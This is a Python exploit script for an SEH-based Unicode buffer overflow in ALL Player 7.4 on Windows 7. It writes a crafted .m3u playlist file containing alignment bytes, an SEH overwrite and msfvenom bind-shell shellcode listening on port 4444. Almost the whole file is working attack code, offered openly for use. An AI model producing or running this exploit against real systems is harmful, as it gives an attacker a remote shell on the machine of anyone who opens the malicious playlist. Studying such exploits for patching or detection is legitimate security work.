#!/usr/bin/python
# Exploit Title: ALL Player v7.4 SEH Buffer Overflow (Unicode)
# Version: 7.4
# Date: 15-08-2017
# Exploit Author: f3ci
# Tested on: Windows 7 SP1 x86

head = "http://"
seh = "\x0f\x47" #0x0047000f
nseh = "\x61\x41" #popad align
junk = "\x41" * 301
junk2 = "\x41" * 45

#msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/unicode_mixed
BufferRegister=EAX -f python
#x86/unicode_mixed succeeded with size 782 (iteration=0)
#Payload size: 782 bytes
buf = ""
buf += "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQ"
buf += "AIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA"
buf += "ZBABABABABkMAGB9u4JBkL7x52KPYpM0aPqyHeMa5pbDtKNpNPBk"
buf += "QBjlTKaBkd4KD2mXzo87pJlfNQ9ovLOLs1cLIrnLMPGQfoZmyqI7"
buf += "GrZRobnwRk1Bn0bknjOLDKPLkaQhGsNhzawaOa4KaIO0M1XSbka9"
buf += "lXISmja9Rkp4TKM1FvMaYofLfaXOjmYqUw08wp0uJVJcqmYhmk3M"
buf += "o4rUk41HTK28NDjaFsrFRklLPK4KaHklzaICTKytbkM1VpSYa4nD"
buf += "NDOkaKaQ291JoaIoWpqOaOQJtKN2HkTMOmOxOCOBIpm0C8CGT3oB"
buf += "OopTC80L2WNFzgyoz5Txf0ZaYpm0kyfdB4np38kycPpkypIoiEPj"
buf += "kXqInp8bKMmpr010pPC8YZjoiOK0yohU67PhLBypjq1L3YzF1ZLP"
buf += "aFaGPh7R9KoGBGKO8U271XEg8iOHIoiohUaGrH3DJLOK7qIo9EPW"
buf += "eG1XBU0nnmc1YoYEC81SrMs4ip4IyS27ogaGnQjVaZn2B9b6jBkM"
buf += "S6I7oTMTMliqkQ2m14nDN0UvKPndb4r0of1FNv0Fr6nn0VR6B31F"
buf += "BH49FlmoTFyoIEbi9P0NPVq6YolpaXjhsWmMc0YoVuGKHpEe3rnv"
buf += "QXVFce5mcmkOiEMlKV1lLJ3Pyk9PT5m5GKoWZsSBRO2JypPSYoxUAA"

#venetian
ven = "\x56"            #push esi
ven += "\x41"           #align
ven += "\x58"           #pop eax
ven += "\x41"           #align
ven += "\x05\x04\x01"   #add eax,01000400
ven += "\x41"           #align
ven += "\x2d\x01\x01"   #add eax,01000100
ven += "\x41"           #align
ven += "\x50"           #push eax
ven += "\x41"           #align
ven += "\xc3"           #ret

buffer = head + junk + nseh + seh + ven + junk2 + buf

print len(buffer)
f=open("C:\Users\Lab\Desktop\player.m3u",'wb')
f.write(buffer)
f.close()

